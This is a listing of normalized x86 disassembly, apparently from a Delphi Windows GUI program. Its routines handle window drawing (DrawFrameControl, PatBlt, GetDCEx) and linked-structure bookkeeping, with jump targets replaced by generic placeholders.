call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_45921c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_417358
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_425648
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459274
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_4248e0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_4252fc
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_42529c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_42529c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_4248e0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_42529c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_42529c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4592fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_45921c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_459274
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_459274
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_45921c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_459274
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_459274
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4593d8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45952e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44e430
mov eax [ ebp - 0x4 ]
call sub_4252d4
xor eax eax
push ebp
push sub_459511
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4256c8
xor eax eax
push ebp
push sub_4594f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_452d84
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4594fb
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4256c8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_452d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44f1f4
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_45953c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_454b84
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_44f29c
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_44f258
mov ecx eax
xor edx edx
xor eax eax
call sub_417358
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_456054
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417380
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_4596b0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4596b0
pop ecx
mov eax ebx
call sub_4032b0
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4596b0
pop ecx
sub_4596e4
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_4596b0
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4032b0
xor eax eax
mov [ esi + 0x64 ] eax
sub_459740
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_458750
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_45977c
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45977c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4599e9
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov edx [ ebp - 0x8 ]
pop eax
call sub_404374
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax [ ebx + 0x14 ]
call sub_457edc
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov edx [ ebp - 0x10 ]
pop eax
call sub_404374
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4032b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4599f0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040d0
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_45828c
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_458404
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_458440
mov eax [ ebx + 0x18 ]
call sub_45828c
mov [ edx + 0x18 ] eax
push esi
push sub_459f8c
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4587b8
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_458440
mov eax [ esi + 0x64 ]
call sub_458404
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4032b0
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_459f64
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4032b0
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_457f88
mov edx eax
mov eax edi
call sub_45842c
mov eax edi
call sub_45828c
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_459f8c
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4587b8
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_459f8c
mov edx [ eax + 0x14 ]
mov eax esi
call sub_4587b8
mov eax [ ebx + 0x14 ]
call sub_4032b0
mov eax edi
call sub_4032b0
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_4599f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_454b84
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407fac
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_45842c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_454af0
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_45842c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_459e14
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_459f8c
xor edx edx
mov eax edi
call sub_4587b8
sub_459ad4
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_458404
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402abc
mov edx eax
mov eax ebx
call sub_45842c
sub_459b10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_459b7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40436c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459b82
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_459b88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_459c37
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_458194
mov eax [ ebp - 0x8 ]
call sub_459b10
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_459b88
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459c3e
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_459b88
pop ecx
sub_459c44
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459d7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_459d2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_454af0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459d33
mov eax [ ebp - 0x10 ]
call sub_4032b0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_459b10
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_454b04
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_459d33
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_459b88
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459d84
lea eax [ ebp - 0x14 ]
call sub_4040ac
retn
sub_459d8c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4584dc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_458504
call sub_459d8c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4584dc
call sub_459d8c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_457f0c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_458404
mov edx eax
mov eax ebx
call sub_45842c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_45842c
jmp r-xdata
sub_459e14
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_459d8c
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_459e58
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_458404
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_45842c
sub_459e88
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_456054
mov edx eax
mov eax [ rw-data ]
call sub_45a9e8
mov eax [ ebx + 0x14 ]
call sub_456054
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_459f9c
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_459ee8
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_45a9e8
mov eax ebx
call sub_459f9c
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_45842c
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_45842c
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_459e14
push ebx
push sub_459f8c
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4587b8
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_459f64
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_454af0
test eax eax
jle r-xdata
push ebx
push sub_459f8c
xor edx edx
mov eax ebx
call sub_4587b8
sub_459f9c
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_457fd0
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_457fd0
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_45803c
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_45803c
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_424bf4
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_45a088
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45a088
pop ecx
mov eax ebx
call sub_458404
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_458404
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45a088
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_458404
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42a114
